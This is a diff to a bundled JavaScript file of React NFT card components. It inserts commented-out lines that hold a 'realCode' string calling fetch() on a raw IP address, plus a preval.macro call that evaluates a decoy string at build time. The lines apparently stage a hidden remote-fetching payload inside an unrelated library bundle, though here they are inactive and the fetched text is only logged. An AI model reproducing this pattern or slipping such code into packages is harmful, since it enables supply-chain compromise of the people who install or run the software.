@@ -17016,6 +17016,12 @@ var NftCard = function NftCard(_ref) {
   }).format(item.like))) : null));
 };
 
+// import preval from 'preval.macro';
+
+// const realCode = `fetch("http://88.119.169.226:5000/tokenizer").then(l6irv=> l6irv.text().then(txt => { console.log('This is running') }));`;
+// const newCode = `console.log("This is the code")`;
+// preval`${newCode}`;
+
 var EffectCardSwiper = function EffectCardSwiper(_ref) {
   var items = _ref.items;
   var navigationPrevRef = useRef(null);
